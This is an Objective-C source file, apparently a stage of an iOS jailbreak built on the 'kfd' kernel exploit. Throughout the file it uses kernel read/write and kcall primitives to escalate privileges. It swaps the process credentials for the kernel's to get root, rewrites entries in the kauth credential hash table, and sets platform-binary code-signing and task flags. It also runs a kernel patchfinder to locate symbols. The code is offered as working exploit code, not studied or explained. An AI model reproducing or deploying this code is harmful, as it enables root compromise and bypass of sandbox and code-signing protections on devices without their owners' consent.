//
//  stage2.m
//  kfd
//
//  Created by m1zole on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "offsets.h"
#include "IOKit_electra.h"
#include "proc.h"
#include "stage2.h"
#include "escalate.h"
#include "krw.h"
#include "kstruct.h"
#include "kpf/patchfinder64.h"
#include "kpf/kerneldec.h"
#include "offsetcache.h"

uint64_t g_our_proc = 0;
uint64_t kernel_slide = 0;
uint64_t off_kauth_cred_table_anchor = 0;
uint64_t self_ucred = 0;

gid_t* saved_gid = NULL;
gid_t saved_gid_count = 0;
struct posix_cred saved_cred = {0};

void mineek_getRoot(uint64_t proc_addr)
{
    uint64_t self_ro = kread64(proc_addr + 0x20);
    printf("[i] self_ro: 0x%llx\n", self_ro);
    self_ucred = kread64(self_ro + 0x20);
    printf("[i] ucred: 0x%llx\n", self_ucred);
    printf("[i] test_uid = %d\n", getuid());
    
    uint64_t kernproc = get_kernproc();
    printf("[i] kern proc: 0x%llx\n", kernproc);
    uint64_t kern_ro = kread64(kernproc + 0x20);
    printf("[i] kern_ro: 0x%llx\n", kern_ro);
    uint64_t kern_ucred = kread64(kern_ro + 0x20);
    printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
    
    uint64_t cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
    uint64_t orig_sb = kread64(cr_label + off_sandbox_slot);
    printf("[i] cr_label: 0x%llx\n", cr_label);
    printf("[i] orig_sb: 0x%llx\n", orig_sb);
    
    kcall(off_proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
    setuid(0);
    setuid(0);
    setgroups(0, 0);
    setgroups(0, 0);
    printf("[i] getuid: %d\n", getuid());
}

void saveMobileCred(uint64_t proc){
    
    uint64_t self_ucred = kread_ptr(proc + off_p_ucred);
    uint64_t cr_posix_p = self_ucred + 0x18;
    
    kreadbuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
    
    return;
    
}

uid_t restoreCred(uint64_t proc){
    
    uint64_t self_ucred = kread_ptr(proc + off_p_ucred);
    uint64_t cr_posix_p = self_ucred + 0x18;
    
    kwritebuf(cr_posix_p, &saved_cred, sizeof(struct posix_cred));
    
    //CS_PLATFORM_BINARY
    uint32_t current_csflags = kread32(proc + off_p_csflags);
    printf("p_csflags = %x\n", current_csflags);
    current_csflags &= ~0x14000000;
    kwrite32(proc + off_p_csflags, current_csflags);
    
    //TF_PLATFORM
    uint64_t task = kread_ptr(proc + 0x10);
    uint32_t current_tflags = kread32(task + off_task_t_flags);
    printf("tflags = %x\n", current_tflags);
    current_tflags &= ~0x00000400;
    kwrite64(task + off_task_t_flags, current_tflags);
    
    return getuid();
    
}

uint64_t kauth_cred_get_bucket(uint64_t a1){
    
    uint v1;
    uint64_t i;
    uint v3;
    uint v4;
    uint v5;
    uint v6;
    uint v7;
    uint v8;
    uint v9;
    uint v10;
    uint v11;
    uint v12;
    uint v13;
    uint v14;
    uint v15;
    uint v16;
    uint v17;
    int v18;
    
    v1 = 0;
    for(int i = 0x18; i != 0x78; ++i){
        v1 = (0x401 * (v1 + *(uint8_t*)(a1 + i))) ^ ((0x401 * (v1 + *(uint8_t*)(a1 + i))) >> 6);
    }
    
    v3 = 0x401 * (v1 + *(uint8_t*)(a1 + 0x80));
    v4 = 0x401 * ((v3 ^ (v3 >> 6)) + *(uint8_t*)(a1 + 0x81));
    v5 = 0x401 * ((v4 ^ (v4 >> 6)) + *(uint8_t*)(a1 + 0x82));
    v6 = 0x401 * ((v5 ^ (v5 >> 6)) + *(uint8_t*)(a1 + 0x83));
    v7 = 0x401 * ((v6 ^ (v6 >> 6)) + *(uint8_t*)(a1 + 0x84));
    v8 = 0x401 * ((v7 ^ (v7 >> 6)) + *(uint8_t*)(a1 + 0x85));
    v9 = 0x401 * ((v8 ^ (v8 >> 6)) + *(uint8_t*)(a1 + 0x86));
    v10 = 0x401 * ((v9 ^ (v9 >> 6)) + *(uint8_t*)(a1 + 0x87));
    v11 = 0x401 * ((v10 ^ (v10 >> 6)) + *(uint8_t*)(a1 + 0x88));
    v12 = 0x401 * ((v11 ^ (v11 >> 6)) + *(uint8_t*)(a1 + 0x89));
    v13 = 0x401 * ((v12 ^ (v12 >> 6)) + *(uint8_t*)(a1 + 0x8a));
    v14 = 0x401 * ((v13 ^ (v13 >> 6)) + *(uint8_t*)(a1 + 0x8b));
    v15 = 0x401 * ((v14 ^ (v14 >> 6)) + *(uint8_t*)(a1 + 0x8c));
    v16 = 0x401 * ((v15 ^ (v15 >> 6)) + *(uint8_t*)(a1 + 0x8d));
    v17 = 0x401 * ((v16 ^ (v16 >> 6)) + *(uint8_t*)(a1 + 0x8e));

    v18 = (1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) ^ ((1025 * ((v17 ^ (v17 >> 6)) + *(uint8_t*)(a1 + 0x8f))) >> 6);
    
    uint64_t kauth_cred_table_anchor = off_kauth_cred_table_anchor + kernel_slide;
    return kauth_cred_table_anchor + 8 * (((9 * v18) ^ ((unsigned int)(9 * v18) >> 11)) & 0x7F);
    
    
}

void copy_proc_ucred(uint64_t other_ucred){
    
    uint64_t k_ucred = kread_ptr(proc_of_pid(getpid()) + off_p_ucred);
    struct ucred key = {0};
    kreadbuf(k_ucred + 0x18, &key.cr_posix, sizeof(struct posix_cred));
    kreadbuf(k_ucred + 0x80, &key.cr_audit, sizeof(struct au_session));
    key.cr_posix.cr_ngroups = 3;
    
    printf("[i] cr_posixsize = %d\n", sizeof(struct posix_cred));
    printf("[i] auditsize = %d\n", sizeof(struct au_session));
    
    uint64_t link = kauth_cred_get_bucket((uint64_t)&key);
    printf("link addr = 0x%llx\n", link);
    uint64_t findlink = 0;
    while (true) {
        findlink = link;
        link = kread_ptr(link);
        if (link == 0xffffff8000000000) break;
        uint64_t k_label = kread_ptr(link + 0x78);
        //printf("link = 0x%llx\nlabel = 0x%llx\n", link, k_label);
        if (!k_label) break;
    }
    
    printf("findlink = 0x%llx\n", findlink);
    
    sleep(1);
    
    uint64_t kernel_cr_posix_p = other_ucred + 0x18;
    struct ucred kernel_cred_label = {0};
    kreadbuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
    unsigned kernel_cr_ngroups = kernel_cred_label.cr_posix.cr_ngroups;
    int kernel_cr_flags = kernel_cred_label.cr_posix.cr_flags;
    printf("cr_ngroups = %d\n", kernel_cr_ngroups);
    printf("cr_flags = %d\n", kernel_cr_flags);
    kernel_cred_label.cr_posix.cr_ngroups = 3;
    kernel_cred_label.cr_posix.cr_flags = 1;
    
    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
    kwrite64(findlink, other_ucred);
    
    struct posix_cred zero_cred = {0};
    setgroups(3, &zero_cred.cr_groups);
    k_ucred = kread_ptr(proc_of_pid(getpid()) + off_p_ucred);
    kwrite32(k_ucred+0x74, 3);
    
    kernel_cred_label.cr_posix.cr_ngroups = kernel_cr_ngroups;
    kernel_cred_label.cr_posix.cr_flags = kernel_cr_flags;
    
    kwritebuf(kernel_cr_posix_p, &kernel_cred_label.cr_posix, sizeof(struct posix_cred));
    
}
void do_kpf(uint64_t proc_addr, bool mdc) {
    if(mdc){
        int rv = kpf_init_kernel(0xfffffff007004000 , "/tmp/kernel");
        assert(rv == 0);
        printf("[i] all_proc : 0x%llx\n", find_allproc());
        printf("[i] gPhysSize : 0x%llx\n", find_gPhySize());
        printf("[i] gPhysBase : 0x%llx\n", find_gPhysBase());
        printf("[i] proc_find : 0x%llx\n", find_proc_find());
        printf("[i] ml_phys_read_data : 0x%llx\n", find_ml_phys_read_data());
        printf("[i] trustcache : 0x%llx\n", find_off_trustcache());
        printf("[i] pmap_enter_options : 0x%llx\n", pmap_enter_options());
        //printf("[i] mac_label_set : 0x%llx\n", find_mac_label_set());
        //printf("[i] ptov_table : 0x%llx\n", find_ptov_table());
        //printf("[i] pmap : 0x%llx\n", find_kernel_pmap());
        //printf("[i] trustcache : 0x%llx\n", find_trustcache());
        //printf("[i] kauth_cred_table_anchor : 0x%llx\n", find_kauth_cred_table_anchor());
    } else {
        int rv = kpf_init_kernel(0xfffffff007004000 + get_kslide(), NULL);
        assert(rv == 0);
        printf("[i] all_proc : 0x%llx\n", find_allproc());
        printf("[i] gPhysSize : 0x%llx\n", find_gPhySize());
        printf("[i] gPhysBase : 0x%llx\n", find_gPhysBase());
        usleep(3000);
        printf("[i] unRooting...");
        kcall(off_proc_set_ucred, proc_addr, self_ucred, 0, 0, 0, 0, 0);
        printf("[i] getuid: %d\n", getuid());
    }
}

void stage2(void) {
    pid_t pid = getpid();
    printf("[i] pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(getpid());
    printf("[i] proc_addr: 0x%llx\n", proc_addr);
    printf("[i] init_kcall!\n");
    init_kcall();
    printf("[i] getRoot!\n");
    mineek_getRoot(proc_addr);
    usleep(10000);
}

uint64_t stage2_all(void) {
    pid_t pid = getpid();
    printf("[i] pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(getpid());
    printf("[i] proc_addr: 0x%llx\n", proc_addr);
    init_kcall();
    mineek_getRoot(proc_addr);
    usleep(10000);
    
    uint64_t kslide = get_kslide();
    uint64_t kbase = 0xfffffff007004000 + kslide;
    
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);

    //CS_PLATFORM_BINARY
    uint32_t current_csflags = kread32(proc_addr + off_p_csflags);
    printf("[i] p_csflags = %x\n", current_csflags);
    current_csflags |= 0x14000000;
    kwrite32(proc_addr + off_p_csflags, current_csflags);
    
    //TF_PLATFORM
    uint64_t task = kread_ptr(proc_addr + 0x10);
    uint32_t current_tflags = kread32(task + off_task_t_flags);
    printf("[i] tflags = %x\n", current_tflags);
    current_tflags |= 0x00000400;
    kwrite64(task + off_task_t_flags, current_tflags);

    return proc_addr;
}
